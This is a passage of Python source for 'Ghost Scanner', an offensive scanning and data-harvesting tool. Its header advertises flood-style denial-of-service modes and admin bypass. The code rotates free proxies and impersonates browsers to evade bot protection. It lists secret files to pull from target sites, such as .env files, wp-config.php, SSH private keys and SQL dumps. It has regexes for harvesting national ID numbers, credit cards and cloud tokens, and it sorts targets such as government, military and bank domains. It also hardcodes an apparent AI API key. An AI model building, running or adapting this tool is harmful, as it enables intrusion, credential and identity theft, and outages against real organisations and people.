#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GHOST SCANNER v5.7 – OMNI TOOLS X SAVAGE
- Fast concurrent harvest (ThreadPool)
- Full sensitive data (50+ patterns)
- Complete PoC for every finding
- Proxy manager: multi-source + health-check + rotation
- AI: multi-key + multi-model fallback
- Fast port probe (threaded)
- Admin PoC (form + SPA/API + JWT)
- Employee correlation
- NIK region decode + employee PDF
- NEW: TLS Flood, RUDY, Slow Read, HTTP/2 Flood
- NEW: Bot Checker (detect bot protection)
- NEW: Admin Bypass (403 bypass, header inject, path trick)
- NEW: Harvest All (deep crawl + download + extract)
"""

import os, sys, time, json, re, random, base64, urllib.parse, socket, threading, ssl, subprocess, shutil, tempfile
from datetime import datetime
from urllib.parse import urljoin, quote, urlparse, parse_qs, urlsplit, urlunsplit, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse, warnings
import requests
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, SpinnerColumn
from rich.table import Table
from rich import box
from fpdf import FPDF
warnings.filterwarnings('ignore')

try:
    import cloudscraper
    CLOUDSCRAPER_OK = True
except ImportError:
    CLOUDSCRAPER_OK = False

try:
    from curl_cffi import requests as curl_requests
    CURL_CFFI_OK = True
except ImportError:
    CURL_CFFI_OK = False

# ============================================================
# KONFIGURASI
# ============================================================
AI_KEYS = [
    'cc_A07j2YrgUcJAfx2UuMIi3F3qohhXV3DCADQmfYYhTh0hvpxF',
]
AI_BASE_URL = 'https://codecraftapi.com/v1'
AI_MODELS = ['claude-opus-5', 'claude-sonnet-5', 'gpt-4o', 'gpt-4-turbo']

PROXY_SOURCES = [
    'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
]

TOOLS_NAME = "Ghost Scanner"
TOOLS_BY = "GhostTeam"
TOOLS_GITHUB = "https://github.com/cozyleon00b-dev"
TOOLS_VERSION = "5.7"

# ============================================================
# SKULL BANNER
# ============================================================
SKULL_ART = r"""
              uuuuuuuuuuuuuuuu
           uu$$$$$$$$$$$$$$$$$$uu
          u$$$$$$$$$$$$$$$$$$$$$$u
         u$$$$$$$$$$$$$$$$$$$$$$$$u
         u$$$$$$$$$$$$$$$$$$$$$$$$u
         u$$$$$$"   "$$$"   "$$$$$$u
         "$$$"      u$u       "$$$"
          $$$u      u$u       u$$$
          $$$u      u$u       u$$$
           "$$$$uu$$$ $$$uu$$$$"
            "$$$$$$$" "$$$$$$$"
              u$$$$$$$u$$$$$$u
               u$"$"$"$"$"$"u
               $$u$u$u$u$u$u$
                $$$$$$$$$$$$
                 "$$$$$$$$"
"""

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
]

# ============================================================
# SENSITIVE PATTERNS
# ============================================================
SENSITIVE_PATTERNS = {
    'nik':            r'\b[0-9]{16}\b',
    'npwp':           r'\b[0-9]{15}\b',
    'nip':            r'\b[0-9]{18}\b',
    'no_rekening':    r'\b[0-9]{10,16}\b',
    'no_hp':          r'(\+62|62|0)8[0-9]{7,12}',
    'sim':            r'\b[0-9]{12,14}\b',
    'bpjs':           r'\b[0-9]{13}\b',
    'passport':       r'\b[A-Z][0-9]{7}\b',
    'email':          r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}',
    'phone_intl':     r'\+[0-9]{1,3}[\s\-]?[0-9\s\-]{6,15}',
    'ssn':            r'\b[0-9]{3}-[0-9]{2}-[0-9]{4}\b',
    'credit_card':    r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9]{2})[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11})\b',
    'iban':           r'\b[A-Z]{2}[0-9]{2}[A-Z0-9]{11,30}\b',
    'swift_bic':      r'\b[A-Z]{6}[A-Z0-9]{2}([A-Z0-9]{3})?\b',
    'ipv4':           r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b',
    'ipv6':           r'\b(?:[A-Fa-f0-9]{1,4}:){7}[A-Fa-f0-9]{1,4}\b',
    'mac_addr':       r'\b(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}\b',
    'gps_coord':      r'-?\d{1,3}\.\d{4,},\s*-?\d{1,3}\.\d{4,}',
    'btc_wallet':     r'\b(?:bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}\b',
    'eth_wallet':     r'\b0x[a-fA-F0-9]{40}\b',
    'xmr_wallet':     r'\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b',
    'sol_wallet':     r'\b[1-9A-HJ-NP-Za-km-z]{32,44}\b',
    'aws_access_key': r'\b(AKIA|ASIA)[0-9A-Z]{16}\b',
    'aws_secret':     r'(?i)aws[_\-]?secret[_\-]?access[_\-]?key["\']?\s*[:=]\s*["\']?([A-Za-z0-9/+=]{40})',
    'gcp_api_key':    r'\bAIza[0-9A-Za-z\-_]{35}\b',
    'azure_key':      r'(?i)azure[_\-]?(?:account|storage|secret)?[_\-]?key["\']?\s*[:=]\s*["\']?([A-Za-z0-9+/=]{40,})',
    'github_pat':     r'\bghp_[A-Za-z0-9]{36}\b',
    'github_oauth':   r'\bgho_[A-Za-z0-9]{36}\b',
    'gitlab_pat':     r'\bglpat-[A-Za-z0-9_\-]{20}\b',
    'slack_token':    r'\bxox[baprs]-[A-Za-z0-9\-]{10,72}\b',
    'stripe_key':     r'\b(?:sk|pk)_(?:live|test)_[A-Za-z0-9]{24,}\b',
    'twilio_sid':     r'\bAC[a-f0-9]{32}\b',
    'sendgrid_key':   r'\bSG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}\b',
    'mailgun_key':    r'\bkey-[a-f0-9]{32}\b',
    'openai_key':     r'\bsk-[A-Za-z0-9]{20,}T3BlbkFJ[A-Za-z0-9]{20,}\b',
    'anthropic_key':  r'\bsk-ant-[A-Za-z0-9\-_]{90,}\b',
    'openrouter_key': r'\bsk-or-v1-[a-f0-9]{64}\b',
    'google_oauth':   r'\b[0-9]+-[a-z0-9_]{32}\.apps\.googleusercontent\.com\b',
    'jwt':            r'\beyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\b',
    'bearer_token':   r'(?i)bearer\s+[A-Za-z0-9\-_.=]{20,}',
    'db_url':         r'(?i)(?:mysql|postgres|postgresql|mongodb|redis|mssql|oracle)://[^\s"\']+',
    'private_key':    r'-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----',
    'firebase_url':   r'https://[a-z0-9\-]+\.firebaseio\.com',
    's3_bucket':      r'\b[a-z0-9.\-]+\.s3(?:[.\-][a-z0-9\-]+)?\.amazonaws\.com\b',
    'internal_ip':    r'\b(?:10|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.[0-9]{1,3}\.[0-9]{1,3}\b',
    'session_id':     r'(?i)(?:session|sess|sid|phpsessid|jsessionid)[_\-]?(?:id)?["\']?\s*[:=]\s*["\']?([A-Za-z0-9\-_.]{16,})',
    'csrf_token':     r'(?i)(?:csrf|xsrf|authenticity)[_\-]?token["\']?\s*[:=]\s*["\']?([A-Za-z0-9\-_.]{16,})',
}

# ============================================================
# CONFIG FILES
# ============================================================
SENSITIVE_FILES_TO_DOWNLOAD = [
    "/.env", "/.env.local", "/.env.production", "/.env.development",
    "/.env.backup", "/.env.old", "/.env.example", "/env",
    "/.git/config", "/.git/HEAD", "/.gitignore",
    "/config.php", "/config.php.bak", "/config.php~",
    "/configuration.php", "/wp-config.php", "/wp-config.php.bak",
    "/settings.py", "/local_settings.py",
    "/config.json", "/config.yaml", "/config.yml",
    "/database.yml", "/database.json",
    "/credentials.json", "/secrets.json",
    "/.htaccess", "/.htpasswd", "/web.config",
    "/Dockerfile", "/docker-compose.yml",
    "/.npmrc", "/.pypirc", "/.netrc", "/.bash_history",
    "/.ssh/id_rsa", "/.ssh/id_rsa.pub", "/.ssh/authorized_keys",
    "/backup.sql", "/backup.zip", "/backup.tar.gz",
    "/db.sql", "/dump.sql", "/database.sql",
    "/phpinfo.php", "/info.php", "/test.php", "/adminer.php",
    "/.well-known/security.txt",
    "/sitemap.xml", "/robots.txt",
    "/server-status", "/server-info",
    "/.DS_Store", "/Thumbs.db",
    "/composer.json", "/composer.lock",
    "/package.json", "/package-lock.json", "/yarn.lock",
    "/Gemfile", "/Gemfile.lock",
    "/requirements.txt", "/Pipfile", "/Pipfile.lock",
    "/.svn/entries", "/.hg/hgrc", "/.bzr/branch/branch.conf",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/.user.ini", "/php.ini",
    "/.eslintrc", "/.prettierrc", "/.editorconfig",
    "/.idea/workspace.xml", "/.vscode/settings.json",
    "/CHANGELOG.md", "/README.md", "/LICENSE",
    "/CONTRIBUTING.md", "/SECURITY.md",
]

# ============================================================
# DOMAIN CATEGORIES
# ============================================================
def classify_domain_full(domain):
    d = domain.lower()
    parts = d.split('.')
    tld = parts[-1]
    second = '.'.join(parts[-2:]) if len(parts) >= 2 else ''

    if second.endswith('.go.id') or '.go.id' in d or 'pemda' in d or 'pemkot' in d or 'pemkab' in d:
        sub = "Pemerintah Daerah" if any(x in d for x in ['pemda','pemkot','pemkab']) else "Pemerintah Pusat"
        return "Government", sub
    if second.endswith('.ac.id') or second.endswith('.sch.id') or second.endswith('.edu'):
        sub = "Sekolah" if '.sch.id' in d else "Universitas" if '.ac.id' in d else "Umum"
        return "Education", sub
    if second.endswith('.mil.id') or 'tni' in d or 'ad.mil' in d or 'al.mil' in d or 'au.mil' in d:
        return "Military", "TNI/Defense"
    if 'polri' in d or 'police' in d:
        return "Police", "Kepolisian"
    if second.endswith('.my.id') or second.endswith('.co.id') or second.endswith('.biz.id') or \
       second.endswith('.web.id') or second.endswith('.or.id') or second.endswith('.net.id') or \
       second.endswith('.id'):
        if any(x in d for x in ['bank','bca','mandiri','bni','bri','btn','cimb','permata','panin','danamon']):
            return "Banking", "Bank/Finance"
        if any(x in d for x in ['shop','store','tokopedia','shopee','lazada','bukalapak','blibli','olshop']):
            return "E-Commerce", "Marketplace"
        if any(x in d for x in ['news','detik','kompas','tempo','kabar','berita','tribun']):
            return "News/Media", "Berita"
        if any(x in d for x in ['rs','rumah-sakit','klinik','hospital','medis','health']):
            return "Medical", "Kesehatan"
        if any(x in d for x in ['islam','kristen','katolik','hindu','buddha','masjid','gereja','vihara','pura']):
            return "Religious", "Keagamaan"
        if any(x in d for x in ['ngo','yayasan','foundation','orphan']):
            return "NGO", "Nirlaba"
        if 'kampus' in d or 'univ' in d or 'universitas' in d:
            return "Education", "Universitas"
        return "Business", "Komersial"

    if tld == 'gov' or tld == 'gob' or tld == 'gc':
        return "Government", "Government"
    if tld == 'mil':
        return "Military", "Military"
    if tld == 'edu':
        return "Education", "Education"
    if tld in ('police',):
        return "Police", "Police"
    if tld == 'int':
        return "International", "International"

    if any(x in d for x in ['bank','credit','finance','invest','trading','forex','crypto','bitcoin','wallet']):
        return "Banking/Finance", "Financial"
    if any(x in d for x in ['shop','store','market','ecom','buy','sell','cart']):
        return "E-Commerce", "Commerce"
    if any(x in d for x in ['news','media','press','magazine','blog','journal']):
        return "News/Media", "Media"
    if any(x in d for x in ['hospital','clinic','health','med','doctor','pharma']):
        return "Medical", "Healthcare"
    if any(x in d for x in ['school','university','college','academy','course','learn']):
        return "Education", "Education"
    if any(x in d for x in ['gov','govt','state','federal','ministry','president']):
        return "Government", "Government"
    if any(x in d for x in ['sex','porn','xxx','adult','escort','cam']):
        return "Adult", "Adult Content"
    if any(x in d for x in ['casino','bet','poker','slot','gamble','jackpot','togel']):
        return "Gambling", "Gambling"
    if any(x in d for x in ['chat','dating','social','friend','match']):
        return "Social/Dating", "Social"
    if any(x in d for x in ['job','career','hire','recruit','lowongan']):
        return "Jobs/Career", "Employment"
    if any(x in d for x in ['travel','hotel','flight','ticket','tour']):
        return "Travel", "Travel"
    if any(x in d for x in ['food','restaurant','recipe','cook','delivery']):
        return "Food/Restaurant", "Food"
    if any(x in d for x in ['game','gaming','esport','steam','play']):
        return "Gaming", "Gaming"
    if any(x in d for x in ['cloud','host','vps','server','domain','dns']):
        return "Hosting/Cloud", "Tech"
    if any(x in d for x in ['api','dev','code','git','tech','software','app']):
        return "Technology", "Tech"

    return "Other", "Unclassified"

# ============================================================
# REGION DETECTOR
# ============================================================
class RegionDetector:
    NIK_PROVINCE = {
        '11':'Aceh','12':'Sumatera Utara','13':'Sumatera Barat','14':'Riau',
        '15':'Jambi','16':'Sumatera Selatan','17':'Bengkulu','18':'Lampung',
        '19':'Kep. Bangka Belitung','21':'Kep. Riau','31':'DKI Jakarta',
        '32':'Jawa Barat','33':'Jawa Tengah','34':'DI Yogyakarta','35':'Jawa Timur',
        '36':'Banten','51':'Bali','52':'NTB','53':'NTT','61':'Kalimantan Barat',
        '62':'Kalimantan Tengah','63':'Kalimantan Selatan','64':'Kalimantan Timur',
        '65':'Kalimantan Utara','71':'Sulawesi Utara','72':'Sulawesi Tengah',
        '73':'Sulawesi Selatan','74':'Sulawesi Tenggara','75':'Gorontalo',
        '76':'Sulawesi Barat','81':'Maluku','82':'Maluku Utara','91':'Papua',
        '92':'Papua Barat'
    }
    PHONE_PREFIX = {
        '0811':'Telkomsel','0812':'Telkomsel','0813':'Telkomsel','0821':'Telkomsel','0822':'Telkomsel','0823':'Telkomsel','0851':'Telkomsel',
        '0814':'Indosat','0815':'Indosat','0816':'Indosat','0855':'Indosat','0856':'Indosat','0857':'Indosat','0858':'Indosat',
        '0817':'XL','0818':'XL','0819':'XL','0859':'XL','0877':'XL','0878':'XL',
        '0831':'Axis','0832':'Axis','0833':'Axis','0838':'Axis',
        '0895':'Tri','0896':'Tri','0897':'Tri','0898':'Tri','0899':'Tri',
        '0881':'Smartfren','0882':'Smartfren','0883':'Smartfren','0884':'Smartfren','0885':'Smartfren','0886':'Smartfren','0887':'Smartfren','0888':'Smartfren','0889':'Smartfren',
    }
    TLD_COUNTRY = {
        '.go.id':'Indonesia','.ac.id':'Indonesia','.sch.id':'Indonesia','.mil.id':'Indonesia',
        '.co.id':'Indonesia','.my.id':'Indonesia','.web.id':'Indonesia','.or.id':'Indonesia',
        '.gov':'United States','.mil':'United States','.edu':'United States',
        '.uk':'United Kingdom','.us':'United States','.sg':'Singapore','.my':'Malaysia',
        '.jp':'Japan','.kr':'South Korea','.cn':'China','.in':'India','.au':'Australia',
        '.de':'Germany','.fr':'France','.it':'Italy','.es':'Spain','.nl':'Netherlands',
        '.ru':'Russia','.br':'Brazil','.ca':'Canada','.mx':'Mexico','.za':'South Africa',
        '.th':'Thailand','.vn':'Vietnam','.ph':'Philippines','.hk':'Hong Kong','.tw':'Taiwan',
    }

    @staticmethod
    def detect(domain, html='', ip_info=None, sensitive_data=None, phone_list=None):
        out = {
            "country": "Unknown", "country_code": "XX", "city": "", "region_name": "",
            "isp": "", "asn": "", "timezone": "", "from_tld": "Unknown",
            "from_ip": "Unknown", "from_nik": [], "from_phone": [], "from_language": "Unknown",
        }

        d = domain.lower()
        for tld, country in RegionDetector.TLD_COUNTRY.items():
            if d.endswith(tld):
                out["from_tld"] = country
                break

        if ip_info:
            out["country"] = ip_info.get("country", out["country"])
            out["country_code"] = ip_info.get("countryCode", out["country_code"])
            out["city"] = ip_info.get("city", "")
            out["region_name"] = ip_info.get("regionName", "")
            out["isp"] = ip_info.get("isp", "")
            out["asn"] = ip_info.get("as", "")
            out["timezone"] = ip_info.get("timezone", "")
            out["from_ip"] = ip_info.get("country", "Unknown")

        if sensitive_data and sensitive_data.get("nik"):
            provinces = set()
            for nik in sensitive_data["nik"][:100]:
                if len(nik) == 16 and nik.isdigit():
                    code = nik[:2]
                    if code in RegionDetector.NIK_PROVINCE:
                        provinces.add(RegionDetector.NIK_PROVINCE[code])
            out["from_nik"] = sorted(provinces)

        if phone_list:
            carriers = set()
            for p in phone_list[:100]:
                p = p.strip()
                if p.startswith('+62'): p = '0' + p[3:]
                if p.startswith('62'): p = '0' + p[2:]
                prefix = p[:4]
                if prefix in RegionDetector.PHONE_PREFIX:
                    carriers.add(RegionDetector.PHONE_PREFIX[prefix])
            out["from_phone"] = sorted(carriers)

        m = re.search(r'<html[^>]*lang=["\']([a-zA-Z\-]+)["\']', html or "", re.I)
        if m:
            out["from_language"] = m.group(1)

        if out["from_ip"] and out["from_ip"] != "Unknown":
            out["country"] = out["from_ip"]
        elif out["from_tld"] and out["from_tld"] != "Unknown":
            out["country"] = out["from_tld"]

        return out

# ============================================================
# PROXY MANAGER
# ============================================================
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.lock = threading.Lock()

    def load_from_sources(self, use_proxy=True, proxy_file=None):
        if not use_proxy: return
        if proxy_file and os.path.exists(proxy_file):
            try:
                with open(proxy_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            if not line.startswith(('http://','https://','socks')):
                                line = 'http://' + line
                            self._add(line)
            except: pass
        for src in PROXY_SOURCES:
            try:
                r = requests.get(src, timeout=15)
                if r.status_code == 200:
                    for line in r.text.strip().split('\n'):
                        p = line.strip()
                        if p:
                            if not p.startswith(('http://','https://','socks')):
                                p = 'http://' + p
                            self._add(p)
            except: pass
        Console().print(f"[green]Loaded {len(self.proxies)} proxies.[/green]")

    def _add(self, url):
        with self.lock:
            if not any(p['url'] == url for p in self.proxies):
                self.proxies.append({'url': url, 'latency': 9999, 'fails': 0})

    def validate(self, max_check=100):
        Console().print(f"[yellow]Validating {min(max_check, len(self.proxies))} proxies...[/yellow]")
        valid = []
        with ThreadPoolExecutor(max_workers=30) as ex:
            futures = [ex.submit(self._check, p) for p in self.proxies[:max_check]]
            for f in as_completed(futures):
                r = f.result()
                if r: valid.append(r)
        valid.sort(key=lambda x: x['latency'])
        self.proxies = valid
        Console().print(f"[green]✓ {len(valid)} proxies validated.[/green]")

    def _check(self, proxy):
        try:
            t0 = time.time()
            r = requests.get('https://www.gstatic.com/generate_204',
                              proxies={'http': proxy['url'], 'https': proxy['url']}, timeout=6)
            if r.status_code == 204:
                proxy['latency'] = time.time() - t0
                return proxy
        except: pass
        return None

    def get(self):
        with self.lock:
            if not self.proxies: return None
            pool = sorted(self.proxies, key=lambda x: x['latency'] + x['fails'] * 5)
            choice = pool[0] if random.random() < 0.7 else random.choice(pool[:min(20, len(pool))])
            return {'http': choice['url'], 'https': choice['url']}

    def mark_fail(self, url):
        with self.lock:
            for p in self.proxies:
                if p['url'] == url:
                    p['fails'] += 1
                    break

# ============================================================
# GHOST SCANNER
# ============================================================
class GhostScanner:
    def __init__(self, target=None, use_proxy=True, proxy_file=None, validate_proxy=False,
                 quick=False, pdf=False, ai=False, delay=0.2, force_admin=False,
                 use_tools=False, scan=False, threads=50, fast=False, deep=False):
        self.target = target
        self.use_proxy = use_proxy
        self.quick = quick
        self.pdf = pdf
        self.ai = ai
        self.delay = delay
        self.force_admin = force_admin
        self.use_tools = use_tools
        self.scan = scan
        self.threads = threads
        self.fast = fast
        self.deep = deep
        self.version = TOOLS_VERSION
        self.start_time = time.time()

        self.results_scan = {
            "target": "", "domain": "", "domain_category": "", "domain_subcategory": "",
            "region": {}, "server_ip": "",
            "timestamp": datetime.now().isoformat(),
            "summary": {"total": 0, "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0},
            "vulnerabilities": {k: [] for k in [
                "sql_injection", "xss", "xss_context_aware", "xss_dom",
                "command_injection", "ssti", "ldap_injection", "nosql_injection",
                "xxe", "ssrf", "path_traversal", "file_inclusion", "open_redirect",
                "csrf", "deserialization", "rce", "lfi", "rfi",
                "deface", "login_bypass", "admin_access", "admin_access_api",
                "wp_activity_log_rce", "robots", "sitemap", "dir_enum",
                "sensitive_files", "config_files", "env_files", "security_headers",
                "waf_detection", "cors", "open_redirect_sneijder", "ssl_info",
                "cookie_flags", "rate_limit_sneijder", "csrf_sneijder", "jwt_attack",
                "http_smuggling", "subdomain_takeover", "graphql_introspection",
                "oauth_bypass", "ddos_vulnerability", "nuclei", "nmap", "ffuf",
                "sqlmap", "dalfox_external", "secretfinder", "interactsh",
                "metasploit", "wireshark", "burpsuite", "user_scanner_osint",
                "bot_protection", "admin_bypass", "harvest_all"
            ]},
            "sensitive_data": {k: [] for k in list(SENSITIVE_PATTERNS.keys()) + [
                "ktp_links", "kk_links", "surat_izin_links", "pdf_links",
                "province_codes", "kabupaten_codes", "kecamatan_codes",
                "bank", "npwp", "nip", "source_code", "tokens", "passwords"
            ]},
            "external": {"subdomains": [], "dns_records": [], "live_hosts": [],
                          "naabu_ports": [], "katana_urls": [], "historical_urls": [],
                          "arjun_params": []},
            "ports_real": [], "ports": [],
            "env_files_found": [], "config_files_found": [],
            "scan_duration": 0, "validated": False,
            "ai_analysis": "", "ai_model_used": "",
            "sensitive_pdfs": [], "admin_data": {},
            "downloaded_docs": [], "sensitive_docs": [], "harvested_docs": [],
            "employee_data": [], "nik_regions": [], "masscan_ports": []
        }

        self.session = requests.Session()
        self.session.verify = False
        self.scraper = self.session
        if CLOUDSCRAPER_OK:
            try:
                self.scraper = cloudscraper.create_scraper(
                    browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True},
                    delay=1, interpreter='native'
                )
            except Exception:
                pass

        self.proxy_mgr = ProxyManager()
        if use_proxy:
            self.proxy_mgr.load_from_sources(use_proxy=True, proxy_file=proxy_file)
            if validate_proxy:
                self.proxy_mgr.validate()

        self.timeout = 15
        self.max_retries = 3
        self.common_ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,
                              1723,3306,3389,5900,8080,8443]
        self.common_params = ['id','page','q','search','user','cat','product','view','sort',
                               'filter','name','email','phone','file','path','redirect','url',
                               'next','return','lang','region','type','mode','action','do',
                               'cmd','command','exec','query','sql','order','by','group',
                               'limit','offset','index','idx']

        self.result_folder = "results"
        self.sensitive_folder = "sensitive_data"
        self.download_folder = "downloads"
        os.makedirs(self.result_folder, exist_ok=True)
        os.makedirs(self.sensitive_folder, exist_ok=True)
        os.makedirs(self.download_folder, exist_ok=True)
        os.makedirs(os.path.join(self.sensitive_folder, "photos"), exist_ok=True)
        os.makedirs(os.path.join(self.sensitive_folder, "pdfs"), exist_ok=True)
        os.makedirs(os.path.join(self.download_folder, "env_files"), exist_ok=True)
        os.makedirs(os.path.join(self.download_folder, "config_files"), exist_ok=True)

        self._last_request_time = 0
        self.waf_detected = None

    # ============================================================
    # REQUEST
    # ============================================================
    def _adaptive_delay(self, rt=0):
        base = self.delay
        if rt > 3: wait = random.uniform(0.6, 1.2)
        elif rt > 1: wait = random.uniform(0.2, 0.5)
        else: wait = random.uniform(0.02, 0.1) if self.fast else random.uniform(0.1, 0.3)
        now = time.time()
        elapsed = now - self._last_request_time
        if elapsed < wait:
            time.sleep(wait - elapsed)
        self._last_request_time = time.time()

    def _smart_request(self, url, timeout=None, method='GET', data=None, headers=None,
                       allow_redirects=True, use_proxy=True, raw=False):
        if timeout is None: timeout = self.timeout
        p = urlparse(url)
        base_url = f"{p.scheme}://{p.netloc}"

        full_headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
        }
        if method.upper() == 'POST':
            full_headers['Origin'] = base_url
            full_headers['Referer'] = url
        if headers: full_headers.update(headers)

        proxy = self.proxy_mgr.get() if (self.use_proxy and use_proxy) else None

        for attempt in range(self.max_retries):
            try:
                t0 = time.time()
                if CURL_CFFI_OK and not raw and random.random() < 0.7:
                    try:
                        kw = dict(headers=full_headers, timeout=timeout,
                                  allow_redirects=allow_redirects, impersonate="chrome120")
                        if proxy: kw['proxies'] = proxy
                        if method.upper() == 'GET':
                            r = curl_requests.get(url, **kw)
                        elif method.upper() == 'POST':
                            r = curl_requests.post(url, data=data, **kw)
                        else:
                            r = curl_requests.request(method, url, data=data, **kw)
                        self._adaptive_delay(time.time() - t0)
                        return r
                    except Exception:
                        pass

                if raw:
                    r = self.session.get(url, headers=full_headers, timeout=timeout,
                                          allow_redirects=allow_redirects, proxies=proxy)
                    return r

                if method.upper() == 'GET':
                    r = self.scraper.get(url, headers=full_headers, timeout=timeout,
                                          allow_redirects=allow_redirects, proxies=proxy)
                elif method.upper() == 'POST':
                    r = self.scraper.post(url, data=data, headers=full_headers, timeout=timeout,
                                           allow_redirects=allow_redirects, proxies=proxy)
                else:
                    r = self.scraper.request(method, url, headers=full_headers, timeout=timeout,
                                              allow_redirects=allow_redirects, proxies=proxy)
                self._adaptive_delay(time.time() - t0)
                if r.status_code in [429, 503, 504, 408]:
                    if proxy: self.proxy_mgr.mark_fail(proxy['http'])
                    time.sleep(1.5 ** attempt)
                    continue
                return r
            except requests.exceptions.ProxyError:
                if proxy: self.proxy_mgr.mark_fail(proxy['http'])
            except requests.exceptions.SSLError:
                pass
            except requests.exceptions.ConnectionError:
                pass
            except Exception:
                pass

            try:
                if method.upper() == 'GET':
                    r = self.session.get(url, headers=full_headers, timeout=timeout,
                                          allow_redirects=allow_redirects)
                else:
                    r = self.session.post(url, data=data, headers=full_headers, timeout=timeout,
                                           allow_redirects=allow_redirects)
                if r.status_code < 400:
                    return r
            except Exception:
                pass
            time.sleep(1.5 ** attempt)
        return None

    def _verify_poc(self, url, initial_response, attempts=2):
        verified = 0
        for _ in range(attempts):
            try:
                r = self._smart_request(url, timeout=8)
                if r and r.status_code == 200 and len(r.text or '') > 0:
                    if abs(len(r.text) - len(initial_response)) < 2000:
                        verified += 1
            except: pass
        return verified >= 1

    # ============================================================
    # EXTRACTORS
    # ============================================================
    def _extract_params_from_url(self, url):
        params = {}
        p = urlparse(url)
        if p.query:
            for kv in p.query.split('&'):
                if '=' in kv:
                    k, v = kv.split('=', 1)
                    params[k] = v
        return params

    def _extract_forms(self, html, base_url):
        forms = []
        for form in re.findall(r'<form[^>]*>(.*?)</form>', html, re.I | re.S):
            m = re.search(r'method=["\'](.*?)["\']', form, re.I)
            method = m.group(1).upper() if m else 'GET'
            a = re.search(r'action=["\'](.*?)["\']', form, re.I)
            action = a.group(1) if a else ''
            action_url = urljoin(base_url, action) if action else base_url
            inputs = []
            for inp in re.findall(r'<input[^>]*>', form, re.I):
                n = re.search(r'name=["\'](.*?)["\']', inp, re.I)
                t = re.search(r'type=["\'](.*?)["\']', inp, re.I)
                if n:
                    inputs.append({'name': n.group(1), 'type': t.group(1) if t else 'text'})
            if inputs:
                forms.append({'method': method, 'url': action_url, 'inputs': inputs})
        return forms

    def _extract_api_endpoints(self, html, base_url):
        endpoints = []
        pats = [r'href=["\'](.*?/api/[^"\']*)["\']',
                r'action=["\'](.*?/api/[^"\']*)["\']',
                r'src=["\'](.*?/api/[^"\']*)["\']']
        for pat in pats:
            for m in re.findall(pat, html, re.I):
                u = urljoin(base_url, m)
                if u not in endpoints and u != base_url:
                    endpoints.append(u)
        return endpoints

    def _extract_sensitive_data(self, text):
        if not text:
            return {k: [] for k in self.results_scan["sensitive_data"].keys()}

        out = {k: [] for k in self.results_scan["sensitive_data"].keys()}

        for key, pattern in SENSITIVE_PATTERNS.items():
            try:
                for m in re.finditer(pattern, text, re.I | re.M):
                    v = m.group(0) if not m.groups() else (m.group(1) or m.group(0))
                    v = v.strip()
                    if 0 < len(v) < 500:
                        out.setdefault(key, []).append(v)
            except: pass

        for nik in out.get('nik', []):
            if len(nik) == 16 and nik.isdigit():
                out['province_codes'].append(nik[:2])
                out['kabupaten_codes'].append(nik[2:4])
                out['kecamatan_codes'].append(nik[4:6])

        for bank in ['bca','mandiri','bni','bri','btn','cimb','permata','danamon',
                     'maybank','panin','ocbc','hsbc','dbs','uob']:
            if bank in text.lower():
                out['bank'].append(bank.upper())

        out['pdf_links'] = list(set(re.findall(r'href=["\']([^"\']+\.pdf)["\']', text, re.I)))
        for link in out['pdf_links']:
            low = link.lower()
            if any(k in low for k in ['ktp','nik','identitas']): out['ktp_links'].append(link)
            if 'kk' in low or 'keluarga' in low: out['kk_links'].append(link)
            if 'izin' in low: out['surat_izin_links'].append(link)

        out['source_code'] = [m[:500] for m in
